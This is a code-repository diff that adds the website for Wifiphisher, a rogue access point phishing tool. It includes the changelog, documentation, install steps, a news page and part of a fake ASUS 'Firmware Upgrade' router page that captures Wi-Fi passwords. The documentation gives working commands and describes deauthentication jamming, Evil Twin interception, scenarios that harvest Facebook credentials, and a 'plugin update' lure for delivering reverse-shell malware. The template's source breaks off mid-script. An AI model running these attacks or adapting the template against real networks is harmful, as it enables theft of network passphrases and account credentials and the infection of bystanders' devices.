- <head>
<title>Wifiphisher - Automated victim-customized phishing attacks against Wi-Fi clients</title>
<style>
    body { 
        background-color: #000405;
    }

    #content {
        font-family: monospace, prestige;
        width: 600px;
        padding: 5px 40px 20px 20px;
        font-size: 12px;
        background-color: white;
        text-align: left;
        border: 2px solid grey;
    }

    a {
        color: #006d91;
    }

    #menu {
        font-family: Arial, Helvetica, Sans-Serif;
        padding-top: 2em;
        padding-bottom: 0.1em;
        font-size: 22px;
        color: #006d91;
    }

    #menu a {
        text-decoration: none;
    }

    h1 { 
        padding-top: 5px;
        font-size: 18px;
    }

    h2 { 
        padding-top: 5px;
        font-size: 16px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }
</style>
</head>
<body>
<center><img width="45%" src="logo.png"></img>
<div id="menu">
<a href="/">Intro</a> || <a href="/download.html">Download</a> || <a href="docs.html">Docs</a> || <a href="changelog.html">Changelog</a> || <a href="research.html">Research</a> 
</div>
<div id="content">

<h1>Changelog</h1>


<h2>Wifiphisher v1.3</h2>
<p><b>Date:</b> Apr 15, 2017</p>
<ul>
<li>Introduced --quitonsuccess (-qS) option. [@javaes]</li>
<li>Introduced Travis CI. [@d33tah]</li>
<li>Install pylint in Travis. [@blackHatMonkey] </li>
<li>Web server migration to Tornado. Fixes various bugs and increases performance. [@sophron] </li>
<li>Remove DNS leases after the script restarts. [@laozi999] </li>
<li>Introduced --internetinterface (-iI) option to provide Internet connectivity to victims. [@sophron] </li>
<li>Added support for iOS and Android to our network manager imitation template. [@alexsalvetti] </li>
<li>Introduced a new deauthentication module. [@blackHatMonkey] </li>
<li>Introduced a new recon module, including new features in target AP selection phase. [@blackHatMonkey] </li>
<li>Code refactoring including a more modular design. [@sophron] </li>
<li>Introduced accesspoint module serving as a hostapd wrapper. [@sophron] </li>
<li>Introducing Lure10, an attack for automatic association against Windows devices. [@sophron] </li>
</ul>

<h2>Wifiphisher v1.2</h2>
<p><b>Date:</b> Dec 5, 2016</p>
<ul>
<li> Web server now starts after DHCP [@sophron]</li>
<li> Support logging of multiple POST values [@sophron]</li>
<li>Include some ASCII art [@sophron]</li>
<li>Introduced 'phishinghttp' module and fixed bugs on HTTP server [@sophron]</li>
<li>Users may now interactively choose the scenario they wish [@blackHatMonkey]</li>
<li>Included an impoved algorithm for detecting and using two of the available network interfaces. [@blackHatMonkey]</li>
<li>Introduced --presharedkey option. Users may now create Evil Twin against password-protected networks. [@sophron]<li>
<li>Introduced "Browser Plugin Update" scenario. [@V1V1]</li>
<li>Packaged the project. Dependencies can now be automatically installed with setup.py. [@sophron]</li>
<li>Added the feature to detect AP vendor based on BSSID. [@lvrach]</li>
<li>Included template engine. [@lvrach]</li>
<li>Fixed issues on Ubuntu. [@lvrach]</li>
<li>Fixed issues on Arch Linux. [@gtklocker]</li>
<li>Included PyRIC project. [@blackhatMonkey]</li>
<li>Introduced --essid option. This will skip the AP selection phase. [@sophron]</li>
<li>Introduced --nojamming option. This will turn off deauthentication. [@sophron]</li>
<li>Introduced new OAuth template. [@sophron]</li>
<li>Introduced new "Wi-Fi Connect" template. [@dionyziz]</li>
</ul>

<h2>Wifiphisher v1.1</h2>
<p><b>Date:</b> Jul 1, 2015</p>
<p>The actual first release of the tool happened on Jan 5 2015. Bugs have been tackled since then. I consider this a maintenance release (1.1) after the major release (1.0) that happened back then.</p>
<ul>
<li>Fixed compatibility with systems defaulting to python3. [@jaseg]</li>
<li>Fixed bug with undefined variable (#7). [@yasoob]</li>
<li>Fixed concatenation error. [@HassenPy]</li>
<li>   Code cleaning. [@yasoob]</li>
<li>   Added connection-reset template. [@shelt]</li>
<li>   PEP8 fixes [@HassenPy]</li>
<li>  Disallowed the usage of an Internet-connected interface for the Access Point as this would reset IP addressing. [@sophron] </li>
<li>   Fixed the bug with the empty password (#97). [@sophron]</li>
<li>   Code restructure. [@sophron]</li>
<li>   Catched exception when another process is listening to one of our ports. [@sophron]</li>
<li>   Output a message when hostapd cannot be installed. [@HassenPy]</li>
<li>   Added support for Pineapple's DD-WRT. [@tgalyean]</li>
</ul>
</div>
</center>
</body>
 213 changes: 213 additions & 0 deletions213  
docs.html
@@ -0,0 +1,213 @@
<head>
<title>Wifiphisher - Automated victim-customized phishing attacks against Wi-Fi clients</title>
<style>
    body { 
        background-color: #000405;
    }

    #content, table {
        font-family: monospace, prestige;
        width: 600px;
        padding: 5px 40px 20px 20px;
        font-size: 12px;
        background-color: white;
        text-align: left;
        border: 2px solid grey;
    }

    a {
        color: #006d91;
    }

    #menu {
        font-family: Arial, Helvetica, Sans-Serif;
        padding-top: 2em;
        padding-bottom: 0.1em;
        font-size: 22px;
        color: #006d91;
    }

    #menu a {
        text-decoration: none;
    }

    h1 { 
        padding-top: 5px;
        font-size: 18px;
    }

    h2 { 
        padding-top: 5px;
        font-size: 16px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }
</style>
</head>
<body>
<center><img width="45%" src="logo.png"></img>
<div id="menu">
<a href="/">Intro</a> || <a href="/download.html">Download</a> || <a href="docs.html">Docs</a> || <a href="changelog.html">Changelog</a> || <a href="research.html">Research</a> 
</div>
<div id="content">
<h1>Documentation</h1>
<h2>NAME</h2>
<p>Wifiphisher - Automated phishing attacks against Wi-Fi networks</p>
<h2>SYNOPSIS</h2>
<p>wifiphisher [Options]</p>
<h2>OPTIONS</h2>
<p>This options summary is printed when Wifiphisher is run with no arguments. Advanced users may edit wifiphisher/constants.py for deeper configuration.</p>
<table>
<tr><td>-h, --help</td><td>show this help message and exit</td></tr>
<tr><td>-s SKIP, --skip SKIP</td><td>Skip deauthing this MAC address. Example: -s
00:11:BB:33:44:AA</td></tr>
<tr><td>-jI JAMMINGINTERFACE, --jamminginterface JAMMINGINTERFACE</td><td>
Manually choose an interface that supports monitor
mode for deauthenticating the victims. Example: -jI
wlan1</td></tr>
<tr><td>
-aI APINTERFACE, --apinterface APINTERFACE</td><td>
Manually choose an interface that supports AP mode for
spawning an AP. Example: -aI wlan0</td></tr>
<tr><td>-t TIMEINTERVAL, --timeinterval TIMEINTERVAL</td><td>
Choose the time interval between DEAUTH packets being
sent</td></tr>
<tr><td>-dP DEAUTHPACKETS, --deauthpackets DEAUTHPACKETS</td><td>
Choose the number of packets to send in each deauth
burst. Default value is 1; 1 packet to the client and
1 packet to the AP. Send 2 deauth packets to the
client and 2 deauth packets to the AP: -p 2</td></tr>
<tr><td>-d, --directedonly</td><td>Skip the deauthentication packets to the broadcast
address ofthe access points and only send them to
client/AP pairs</td></tr>
<tr><td>-nJ, --nojamming</td><td>Skip the deauthentication phase. When this option is
used, only one wireless interface is required</td></tr>
<td>-e ESSID, --essid ESSID</td><td>
Enter the ESSID of the rogue Access Point. This option
will skip Access Point selection phase. Example:
--essid 'Free WiFi'</td></tr>
<tr><td>-p PHISHINGSCENARIO, --phishingscenario PHISHINGSCENARIO</td><td>
Choose the phishing scenario to run.This option will
@Cahlbrand
Cahlbrand on Aug 15, 2018
Phishingscenario

@14852vance	Reply…
skip the scenario selection phase. Example: -p
firmware_upgrade</td></tr>
<tr><td>-pK PRESHAREDKEY, --presharedkey PRESHAREDKEY</td><td>
Add WPA/WPA2 protection on the rogue Access Point.
Example: -pK s3cr3tp4ssw0rd</td></tr>
</table>
<h2>DESCRIPTION</h2>
<p>
Wifiphisher is a security tool that mounts automated phishing attacks against Wi-Fi networks in order to obtain credentials or infect the victims with malwares. It is a social engineering attack that can be used to obtain WPA/WPA2 secret passphrases and unlike other methods it does not include any brute forcing. It is an easy way for obtaining credentials from social networks or other third party login pages.</p>
<p>After achieving a man-in-the-middle position using the Evil Twin attack, Wifiphisher redirects all HTTP requests to an attacker-controlled phishing page.</p>
<p>From the victim's perspective, the attack makes use in three phases:</p>
<ol>
<li>Victim is being deauthenticated from her access point. Wifiphisher continuously jams all of the target access point's wifi devices within range by forging “Deauthenticate” or “Disassociate” packets to disrupt existing associations.</li>
<li>Victim joins a rogue access point. Wifiphisher sniffs the area and copies the target access point's settings. It then creates a rogue wireless access point that is modeled by the target. It also sets up a NAT/DHCP server and forwards the right ports. Consequently, because of the jamming, clients will eventually start connecting to the rogue access point. After this phase, the victim is MiTMed.</li>
<li>Victim is being served a realistic specially-customized phishing page. Wifiphisher employs a minimal web server that responds to HTTP & HTTPS requests. As soon as the victim requests a page from the Internet, wifiphisher will respond with a realistic fake page that asks for credentials or serves malwares. This page will be specifically crafted for the victim. For example, a router config-looking page will contain logos of the victim's vendor. The tool supports community-built templates for different phishing scenarios.</li>
</ol>

<h2>EXAMPLES</h2>

> wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade

<p>Use wlan0 for spawning the rogue Access Point and wlan4 for DoS attacks. Select the target network manually from the list and perform the "Firmware Upgrade" scenario.</p>
<p>Useful for manually selecting the wireless adapters. The "Firware Upgrade" scenario is an easy way for obtaining the PSK from a password-protected network.</p>

> wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd

<p>Automatically pick the right interfaces. Target the Wi-Fi with ESSID "CONFERENCE_WIFI" and perform the "Plugin Update" scenario. The Evil Twin will be password-protected with PSK "s3cr3tp4ssw0rd".</p>

<p>Useful against networks with disclosed PSKs (e.g. in conferences). The "Plugin Update" scenario provides an easy way for getting the victims to download malicious executables (e.g. malwares containing a reverse shell payload).</p>

> wifiphisher --nojamming --essid "FREE WI-FI" -p oauth-login

<p>Do not target any network. Simply spawn an open Wi-Fi network with ESSID "FREE WI-FI" and perform the "OAuth Login" scenario.</p>
<p>Useful against victims in public areas. The <a href="http://wifiphisher.org/ps/oauth-login/">OAuth Login</a> scenario provides a simple way for capturing credentials from social networks, like Facebook.</p> 

<h2>PHISHING SCENARIOS</h2>
<p>Wifiphisher supports community-built templates for different phishing scenarios. Currently, the following phishing scenarios are in place:</p>
<ul>
<li>Firmware Upgrade Page: A router configuration page without logos or brands asking for WPA/WPA2 password due to a firmware upgrade. Mobile-friendly.</li>
<li>OAuth Login Page: A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth.</li>
<li>Browser Plugin Update: A generic browser plugin update page that can be used to serve payloads to the victims.</li>
<li>Network Manager Connect: Imitates the behavior of the network manager. This template shows Chrome's "Connection Failed" page and displays a network manager window through the page asking for the pre-shared key. Currently, the network managers of Windows and MAC OS are supported.</li>
</ul>

<h3>Creating a custom phishing scenario</h3>
<p>For specific target-oriented attacks, custom scenarios may be necessary.
Creating a phishing scenario is easy and consists of two steps:</p>
<ol><li> Create the config.ini
<p>A config.ini file lies in template's root directory and its contents can be divided into two sections:</p>
<ol><li>info: This section defines the scenario's characteristics.</li>
<ul>
<li>Name (mandatory): The name of the phishing scenario</li>
<li>Description (mandatory): A quick description (<50 words) of the scenario</li>
<li>PayloadPath (optional): If the phishing scenario pushes malwares to victims, users can insert the absolute path of the malicious executable here</li>
</ul>
<li>context: This section is optional and holds user-defined variables that may be later injected to the template.</li>
<h4>Example</h4>
Here's an example of a config.ini file:
<pre>
> # This is a comment
> [info]
> Name: ISP warning page
> Description: A warning page from victim's ISP asking for DSL credentials
>
> [context]
> victim_name: John Phisher
> victim_ISP: Interwebz
</pre>
</ol>
</li>
<li> Create the template files</li>
<p>A template contains the static parts of the desired HTML output and may consist of several static HTML files, images, CSS or Javascript files. Dynamic languages (e.g. PHP) are not supported.</p>
<h4>Placeholders</h4>
<p>
The HTML files may also contain some special syntax (think placeholders) describing how dynamic content will be inserted. The dynamic contect may originate from two sources:</p>
<ol>
<li>Beacon frames.</li><p>Beacon frames contain all the information about the target network and can be used for information gathering. The main process gathers all the interesting information and passes them to the chosen template on the runtime.</p>
<p>At the time of writing, the main process passes the following data:</p>
<ul>
<li>target_ap_essid &lt;str&gt;: The ESSID of the target Access Point</li>
<li>target_ap_bssid &lt;str&gt;: The BSSID (MAC) address of the target Access Point</li>
<li>target_ap_channel &lt;str&lt;: The channel of the target Access Point</li>
<li>target_ap_vendor &lt;str&gt;: The vendor's name of the target Access Point</li>
<li>target_ap_logo_path &lt;str&gt;: The relative path of the target Access Point vendor's logo in the filesystem</li>
<li>APs_context &lt;list&gt;: A list containing dictionaries of the Access Points captured during the AP selection phase</li>
<li>AP &lt;dict&gt;: A dictionary holding the following information regarding an Access Point:</li>
<ul>
<li>channel &lt;str&gt;: The channel of the Access Point</li>
<li>essid &lt;str&gt; The ESSID of the Access Point</li>
<li>bssid &lt;str&gt; The BSSID (MAC) address of the Access Point</li>
<li>vendor &lt;str&gt; The vendor's name of the Access Point</li>
</ul>
</ul>
<p>Note that the above values may be 'None' accordingly. For example, all the target_* values will be None if there user did not target an Access Point (by using --essid option). The 'target_ap_logo_path' will be None if the logo of the specific vendor does not exist in the repository.</p>

<li>config.ini file (described above).</li><p>All the variables defined in the "Context" section may be used from within the template files.
In case of naming conflicts, the variables from the configuration file will override those coming from the beacon frames.</p>
</ol>
<h4>Logging credentials</h4>
<p>
In order for wifiphisher to know which credentials to log, the values of the 'name' HTML attributes need to be prefixed with the 'wfphshr' string. During POST requests, wifiphisher will log all variables that are prefixed with this string.</p>
<h4>Example</h4>
<p>Here's a snippet from a template (index.html):</p>
<!--
> <p> Dear {{ victim_name }}, This is a message from {{ ISP }}.
> A problem was detected regarding your {{ target_ap_vendor }} router. </p>
> <p> Please write your credentials to re-connect over PPPOE/PPPOA.</p>
> <input type="text" name="wphshr-username"></input>
> <input type="text" name="wphshr-password"></input>
--!>
<p>
In this example, 'victim_name' and 'ISP' variables come from config.ini, while 'target_ap_vendor' variable is from the beacon frames. Both "wphshr-username" and "wphshr-password" will be logged.</p>
</div>
</center>
</body>
 101 changes: 101 additions & 0 deletions101  
download.html
@@ -0,0 +1,101 @@
<head>
<title>Wifiphisher - Automated victim-customized phishing attacks against Wi-Fi clients</title>
<style>
    body { 
        background-color: #000405;
    }

    #content {
        font-family: monospace, prestige;
        width: 600px;
        padding: 5px 40px 20px 20px;
        font-size: 12px;
        background-color: white;
        text-align: left;
        border: 2px solid grey;
    }

    a {
        color: #006d91;
    }

    #menu {
        font-family: Arial, Helvetica, Sans-Serif;
        padding-top: 2em;
        padding-bottom: 0.1em;
        font-size: 22px;
        color: #006d91;
    }

    #menu a {
        text-decoration: none;
    }

    h1 { 
        padding-top: 5px;
        font-size: 18px;
    }

    h2 { 
        padding-top: 5px;
        font-size: 16px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }
</style>
</head>
<body>
<center><img width="45%" src="logo.png"></img>
<div id="menu">
<a href="/">Intro</a> || <a href="/download.html">Download</a> || <a href="docs.html">Docs</a> || <a href="changelog.html">Changelog</a> || <a href="research.html">Research</a> 
</div>
<div id="content">
<h1>1. Download</h1>

Wifiphisher source releases are described below. The tool is distributed with source code under the terms of the GNU General Public License.

<h2>a. Stable version</h2>
<p>Wifiphisher is available for download on Github. Link is provided below.</p>

<p>It is recommended to verify the authenticity of a Wifiphisher release by checking the integrity of the downloaded files. GPG detached signatures and SHA-1 hashes for the releases are available below. You may find my public key on the usual PGP public servers.</p>

<p>Latest stable Wifiphisher release gzip compressed tarball: <a href="https://github.com/wifiphisher/wifiphisher/archive/v1.3.tar.gz">wifiphisher-1.3.tar.gz</a> (on Github)</p>
<p>SHA256 Checksum: <a href="/sigs/wifiphisher-1.3.tar.gz.sha256">wifiphisher-1.3.tar.gz.sha256</a></p>
<p>Signature: <a href="/sigs/wifiphisher-1.3.tar.gz.asc">wifiphisher-1.3.tar.gz.asc</a></p>

<h2>b. Latest development</h2>
<p>To clone the latest development revision using git, type the following command. </p>

<p> > git clone https://github.com/wifiphisher/wifiphisher.git </p>

<h1>2. Install</h1>

<h2>a. Requirements</h2>
Following are the requirements for getting the most out of Wifiphisher:
<ul>
<li>Kali Linux. Although people have made Wifiphisher work on other distros, Kali Linux is the officially supported distribution, thus all new features are primarily tested on this platform.</li>
<li>One wireless network adapter that supports AP mode. Drivers should support netlink.</li>
<li>One wireless network adapter that supports Monitor mode and is capable of injection. Again, drivers should support netlink. If a second wireless network adapter is not available, you may run the tool with the --nojamming option. This will turn off the de-authentication attack though.</li>
</ul> 

<h2>b. Install from Package Manager</h2>
<p>Wifiphisher has been packaged by many Linux security distributions (including Kali Linux and Arch Linux). While these packages are generally quicker and easier to install, they are not always up-to-date. To install Wifiphisher package on Kali Linux you can type:</p>
<p> > apt-get install wifiphisher</p>


<h2>c. Install from Source</h2>

<p>Assuming you downloaded and verified a Wifiphisher tar file, you can now install the tool by typing the following commands:</p>

<pre>
> tar xvf wifiphisher.tar.gz
> cd wifiphisher # Switch to tool's directory
> sudo python setup.py install # Install any dependencies
</pre>

</div>
</center>
</body>
 136 changes: 136 additions & 0 deletions136  
index.html
@@ -0,0 +1,136 @@
<head>
<title>Wifiphisher - Automated victim-customized phishing attacks against Wi-Fi clients</title>
<style>
    body { 
        background-color: #000405;
    }

    #content {
        font-family: monospace, prestige;
        width: 600px;
        padding: 5px 40px 20px 20px;
        font-size: 12px;
        background-color: white;
        text-align: left;
        border: 2px solid grey;
    }

    a {
        color: #006d91;
    }

    #menu {
        font-family: Arial, Helvetica, Sans-Serif;
        padding-top: 2em;
        padding-bottom: 0.1em;
        font-size: 22px;
        color: #006d91;
    }

    #menu a {
        text-decoration: none;
    }

    h1 { 
        padding-top: 5px;
        font-size: 18px;
    }

    h2 { 
        padding-top: 5px;
        font-size: 16px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }
</style>
</head>
<body>
<center><img width="45%" src="logo.png"></img>
<div id="menu">
<a href="/">Intro</a> || <a href="/download.html">Download</a> || <a href="docs.html">Docs</a> || <a href="changelog.html">Changelog</a> || <a href="research.html">Research</a> 
</div>
<div id="content">
<h1>Introduction</h1>
<p>Wifiphisher is an effective rogue Access Point tool downloaded by hundreds of
Wi-Fi hackers everyday. It is free and open source software currently available
for Linux.</p> 

<p>This site aims to provide with resources regarding the tool usage and the
ongoing research. The most important changes (features, bugfixes etc) in each
Wifiphisher version are described on the <a href="changelog.html">Changelog</a>.
Using Wifiphisher is covered on the <a href="docs.html">Documentation
Guide</a>.</p>

<p>Happy phishing! :)</p>


<h1>News</h1>


<h2>Wifiphisher v1.3 (with Lure10 support) is out!</h2>


<p><b>Date:</b> 2017-04-15</p>

<p>Wifiphisher v1.3 is out with many new features. Check them out on the <a href="changelog.html">Changelog</a> page or go straight to the <a href="download.html">Download</a> page to try the new release.</p>

<p>This new release includes the Lure10 attack, a novel way for associating automatically with any device that is within range running the latest Windows. A couple of days ago I gave a presentation at Hack In The Box security conference in Amsterdam disclosing the technical details of this attack. You can find the presentation material on the <a href="research.html">Research</a> page.</p>

<p>We now have a dedicated repo for phishing scenarios <a href="https://github.com/wifiphisher/extra-phishing-pages">here</a>. If you have ever created a phishing scenario using Wifiphisher's template engine, you are welcome to share it with the rest of the community by sumitting a Pull Request there.

<p>Enjoy the new release everyone!</p> 

<center><img src="lure10_300x161.png"></img></center>


<hr>

<h2>33C3 Lightning talk: Efficient Wi-Fi Phishing</h2>

<p><b>Date:</b> 2017-01-01</p>

<p>Happy new year everyone.</p>

<p>Last week I was happy to give a lightning talk at 33C3. You can find all the material from the talk on the <a href="research.html">Research</a> page.</p>

<hr>

<h2>Wifiphisher v1.2 is out!</h2>

<p><b>Date:</b> 2016-12-05</p>

Wifiphisher v1.2 is finally out. The two biggest improvements include:

<ol>
<li>Three new phishing scenarios:
<ul>
<li><a href="/ps/wifi_connect/">WiFi Connect</a> - A novel way for obtaining a PSK of a password-protected Wi-Fi
network even from the most advanced users by showing a web-based imitation of
the OS network manager.</li>
<li><a href="/ps/oauth-login/">OAuth Login</a> - A scenario for capturing credentials from social networks, like
Facebook. </li>
<li><a href="/ps/plugin_update/">Plugin Update</a> - A scenario for getting the victims to download malicious
executables (e.g. malwares containing a reverse shell payload)</li>
</ul>
<li>A new template engine. Users may now easily create their own phishing scenario or customize the existing ones according to their needs. Our <a href="docs.html">documentation guide</a> covers this new feature in much detail.</li>
</ol>

<p>You may see the full list of changes on the <a href="changelog.html">Changelog</a> or go straight to the <a href="download.html">Download</a> page.</p>

<p>I would like to thank all the community contributing to this release by writing code or reporting bugs. Special thanks to:</p> 
<ul>
<li>Kostis Karantias</li>
<li>Stergios Kolios</li>
<li>Dale Patterson</li>
<li>Brian Smith</li>
<li>Leonidas Vrachnis</li>
<li>Dionysis Zindros</li>
</ul>

<p>Enjoy the release and if you find any bugs you are encouraged to report them on our <a href="https://github.com/wifiphisher/wifiphisher">Github page</a>.</p>
</div>
</center>
</body>
 Binary file addedBIN +41.8 KB 
logo.png

 Binary file addedBIN +11.5 KB 
lure10_300x161.png

 Binary file addedBIN +23.8 KB 
lure10_600x321.png

 Binary file addedBIN +3.49 KB 
ps/firmware-upgrade/asus.png

 6 changes: 6 additions & 0 deletions6  
ps/firmware-upgrade/bootstrap.min.css
Large diffs are not rendered by default.

 7 changes: 7 additions & 0 deletions7  
ps/firmware-upgrade/bootstrap.min.js
Large diffs are not rendered by default.

 Binary file addedBIN +14.1 KB 
ps/firmware-upgrade/cisco.png

 9 changes: 9 additions & 0 deletions9  
ps/firmware-upgrade/config.ini
@@ -0,0 +1,9 @@
[info]
Name: Firmware Upgrade Page
Description: A router configuration page without logos or brands asking for WPA/WPA2 password due to a firmware upgrade. Mobile-friendly.

[context]
firmware_version: 1.0.12

# Comment in the line below to override automatic vendor detection
# target_ap_vendor: AP_VENDOR
 Binary file addedBIN +13.7 KB 
ps/firmware-upgrade/dlink.png

 340 changes: 340 additions & 0 deletions340  
ps/firmware-upgrade/index.html
@@ -0,0 +1,340 @@
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Router Configuration Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap.min.css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap.min.js"></script>

  <!-- CSS -->
  <style type="text/css">

        #blackBar{
        color: white;
        text-align: center;
        position:fixed;
        top:0;
        left:0;
        width:100%;
        height:25px;
        background-color:black;
        }

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }

    img {
        width: auto;
        max-width: 100%;
        height: auto;
    }
  </style>

</head>

<body>

<div id="blackBar">Don't get phished. This is a phishing scenario and is part of the Wifiphisher tool.</div>
  <!-- Start navigation bar -->
  <!-- To change the navigation bar color change background attribute -->
  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
    <div class="container-fluid">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <!--
        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
        -->
      </div>
      <div class="collapse navbar-collapse" id="myNavbar">
        <ul class="nav navbar-nav">
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Setup</a></li>
              <li><a href="#">DDNS</a></li>
              <li><a href="#">MAC Address Clone</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Wireless Settings</a></li>
              <li><a href="#">Wireless Security</a></li>
              <li><a href="#">Wireless MAC Filter</a></li>
              <li><a href="#">Advanced Wireless Settings</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Firewall</a></li>
              <li><a href="#">VPN</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Internet Access</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Management</a></li>
              <li><a href="#">Log</a></li>
              <li><a href="#">Diagnostics</a></li>
              <li><a href="#">Factory Defaults</a></li>
              <li><a href="#">Config Manegements</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Router</a></li>
              <li><a href="#">Local Network</a></li>
              <li><a href="#">Wireless</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <!-- End navigation bar -->

  <!-- Start page content -->
  <div class="container">
	   <div class="col-sm">
         <center><img src="asus.png"></img></center>
       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
    	 <p class="lead">A new version of the ASUS firmware 1.0.12 has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
     </div>
    <form>
      <div class="form-group">

        <p><label for="essid">ESSID:</label> BOB_HOME</p>
        <label for="comment">Terms And Conditions:</label>
        <textarea readonly class="form-control" rows="5" id="comment">
1. LICENSE.

Subject to the terms and conditions of this Software License Agreement, ASUS hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the ASUS Firmware/Software/Drivers only in conjunction with ASUS products. The ASUS Company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed.

2. NO WARRANTY.

The ASUS Firmware/Software/Drivers are provided "AS IS" without warranty of any kind. ASUS Company does not warrant that the functions contained in the Firmware/Software/Drivers will meet your requirements or that the operation of the ASUS Firmware/Software/Drivers will be uninterrupted or error-free. ASUS Company hereby disclaims all warranties, express or implied, with respect to the ASUS firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement.

3. NO LIABILITY.

In no event shall ASUS Company or any other party which has been involved in the creation, production, or delivery of the ASUS Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the ASUS Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
       </textarea>
        <div class="checkbox">
          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
        </div>
      </div>
      <div class="form-group has-feedback">
          <label for="pwd">WPA2 Pre-Shared Key:</label>
          <input class="form-control" type="password" id="pwd" disabled>
      </div>
      <div class="container text-center">
        <button class="btn btn-primary" id="btn">Start Upgrade</button>
      </div>
    </form>
    <div id="push"></div>
  </div>
  <!-- Start page content -->

  <!-- Start footer -->
  <footer class="footer">
    <div class="container text-center">
      <p class="text-muted">© ASUS 2016, All Rights Reserved.</p>
    </div>
  </footer>
  <!-- End footer -->

  <!-- Start update first message -->
  <div class="modal fade" id="update-only" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Upgrade is required.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End update first message -->

  <!-- Start empty password message -->
  <div class="modal fade" id="empty-pass">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Input Valid Password.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End empty password message -->

  <!-- Start empty password message -->
  <div class="modal fade" id="no-checkbox">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Check The I Agree Button.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End empty password message -->

<script>

/*
  Check the password field and act accordingly.
*/
$("#btn").on("click", function(e) {
    e.preventDefault();

    // get the password box and checkbox elements
  	var input = document.getElementById("pwd");
    var box = document.getElementById("check-box");

    // if the box is checked
  	if ( box.checked == true )
  		{
        // check to see if the value is empty
      	if ( input.value == "" )
      		{
            // display no password message
            $("#empty-pass").modal("show");

      		}
      	else
      		{
            // post the data
            post('upgrading.html', {"wfphshr-wpa-password": input.value});
      		}
      }
    else
      {
        // display no checkbox message
        $("#no-checkbox").modal("show");
      }
});

/*
